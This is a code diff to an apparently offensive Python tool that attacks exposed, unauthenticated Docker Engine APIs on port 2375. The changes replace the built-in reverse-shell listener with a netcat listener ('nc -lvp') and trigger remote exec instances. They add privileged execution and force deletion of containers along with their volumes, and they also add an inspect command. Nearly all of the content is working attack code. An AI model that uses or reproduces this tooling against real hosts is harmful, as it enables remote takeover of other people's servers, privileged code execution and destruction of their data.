@@ -10,6 +10,8 @@ import os
 from multiprocessing.pool import ThreadPool
 import requests
 import time
+import subprocess
+import threading
 
 
 APP_NAME = """
@@ -32,11 +34,7 @@ INFO = """
 [green]##############################################[/green]
 """
 
-BUGS = [
-    "    > [red]Using the Reverse Shell you would have to press ENTER sometimes to go on[/red]\n"
-    "    > [red]Some commands don't show their outputs unless ENTER is pressed[/red]\n"
-    "    > [red]Custom commands execution does not show the result and gives errors[/red]"
-]
+BUGS = []
 
 c = Console(color_system="truecolor")
 
@@ -53,6 +51,13 @@ class Threading:
             scan = prog.add_task("Progress", total=iterable_len)
             for loop_index, _ in enumerate(pool.imap(function, iterable), 1):
                 prog.update(scan, advance=1.0)
+
+    @staticmethod
+    def run_single_thread(function, args: List[Any], daemon: bool=True) -> threading.Thread:
+        t = threading.Thread(target=function, args=args, daemon=daemon)
+        t.start()
+        
+        return t
 
 
 class PortScanner:
@@ -116,10 +121,6 @@ class PortScanner:
 
 class ReverShellHandler:
     def __init__(self, lhost: str, lport: int) -> None:
-        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.__socket.bind((lhost, lport))
-        self.__socket.listen(1)
-
         c.print(f"[*] Started Reverse Shell Handler on {lhost}:{lport} ... ")
 
         self.__lhost = lhost
@@ -127,34 +128,15 @@ class ReverShellHandler:
 
     def handle_rv(self, exec_start: Dict[str, bool], addr: str, exec_id: str) -> None:
         try:
+            remote_shell_process = Threading.run_single_thread(
+                function=subprocess.run,
+                args=(['/bin/bash', '-c', f'nc -lvp {self.__lport}'], )
+            )
             response = requests.post(f"http://{addr}/exec/{exec_id}/start", json=exec_start)
-            conn, addr = self.__socket.accept()
-            c.print(f"[*] Connection {addr} => {self.__lhost}:{self.__lport}")
-
-            while True:
-                while 1:
-                    try:
-                        ans = conn.recvmsg(1024)[0].decode()
-                        ans = ans.split("\n")[:-1]
-                        if ans == [] or ans == ['']:
-                            break
-                        else:
-                            print("\n".join(ans))
-                    except KeyboardInterrupt:
-                        print()
-                        break
-
-                command = Prompt.ask("([blue]rvshell[/blue]) $ ")
-
-                #Send command
-                command += "\n"
-                conn.send(command.encode())
-                time.sleep(0.10)
         except KeyboardInterrupt:
             ...
 
         c.print(f"[*] Connection Closing ... ", style="yellow")
-        self.__socket.close()
 
 
 class Command:
@@ -236,7 +218,11 @@ class Commands:
         "remove"   : Command(name="remove",
                              desc="Remove one or more containers",
                              cmd="remove [names=[NAME1, ...]]",
-                             info="If no name given, remove the one named with NAME")
+                             info="If no name given, remove the one named with NAME"),
+        "inspect"  : Command(name="inspect",
+                             desc="Inspect a specific container",
+                             cmd="inspect [name=NAME]",
+                             info="If not name given inspect the container named with NAME")
     }
 
     @classmethod
@@ -254,7 +240,8 @@ class RemoteDockerExecution:
                 justify="center"
         )
         c.print(INFO + "\n\n", justify="center")
-        c.print("Bugs that needs to be fixed:\n" + "".join(BUGS) + "\n\n")
+        if len(BUGS) > 0:
+            c.print("Bugs that needs to be fixed:\n" + "".join(BUGS) + "\n\n")
 
         self.__rhost        = "0.0.0.0"
         self.__rport        = 2375
@@ -289,7 +276,8 @@ class RemoteDockerExecution:
                 "AttachStdin" : True,
                 "AttachStdout" : True,
                 "AttachStderr" : True,
-                "Tty" : True
+                "Tty" : True,
+                "Privileged": True
             },
             "exec_start" : {
                 "Tty" : True
@@ -332,7 +320,10 @@ class RemoteDockerExecution:
         _available_ports = data["Ports"]
         ports = {"Ports": []}
         for port in _available_ports:
-            port_str = f"{port['PrivatePort']} -> {port['PublicPort']}(type={port['Type']})"
+            ip = "" if "IP" not in port else port["IP"]
+            priv_port = "" if "PrivatePort" not in port else port["PrivatePort"]
+            publ_port = "" if "PublicPort" not in port else port["PublicPort"]
+            port_str = f"{publ_port} -> {priv_port}(type={port['Type']},ip={ip})"
             ports["Ports"].append(port_str)
 
         # Takes labels
@@ -532,12 +523,12 @@ class RemoteDockerExecution:
         c.print(f"[*] Executing command: [yellow]'{cmd}'[/yellow]")
         
         response = requests.post(f"http://{addr}/containers/{self.__name}/exec", json=data)
-        exec_id = response.json()["Id"]
-        c.print(f"[*] [green]Exec instance created with ID[/green]: \n{exec_id}")
-
         if response.status_code != 201:
             c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
             raise Exception
+
+        exec_id = response.json()["Id"]
+        c.print(f"[*] [green]Exec instance created with ID[/green]: \n{exec_id}")
 
         if command == "rvshell":
             try:
@@ -597,7 +588,7 @@ class RemoteDockerExecution:
             for container in containers:
                 infos = RemoteDockerExecution.extrapolate_informations_from_json(container)
                 contents[infos["Name"]] = infos
-            
+                
             c.print(contents)
         except KeyError as ke:
             print(ke)
@@ -610,12 +601,26 @@ class RemoteDockerExecution:
         
         addr = f"{self.__rhost}:{self.__rport}"
         for name in names:
-            response = requests.delete(f"http://{addr}/containers/{name}")
+            response = requests.delete(f"http://{addr}/containers/{name}?v=true&force=true")
             if response.status_code != 204:
                 c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
                 raise Exception
             
             c.print(f"[*] [green]Removed container {name}[/green]")
+
+    def inspect(self, *args) -> None:
+        if len(args) > 0:
+            name = list(args)[0].split("=")[1]
+        else:
+            name = self.__name
+
+        addr = f"{self.__rhost}:{self.__rport}"
+        response = requests.get(f"http://{addr}/containers/{name}/json")
+        if response.status_code != 200:
+            c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
+            raise Exception
+        
+        c.print(response.json())
 
     def run(self) -> None:
         maps = {
@@ -633,7 +638,8 @@ class RemoteDockerExecution:
             "stop"     : self.stop,
             "execute"  : self.cexec,
             "lstconts" : self.list_containers,
-            "remove"   : self.remove
+            "remove"   : self.remove,
+            "inspect"  : self.inspect
         }
 
         while True:
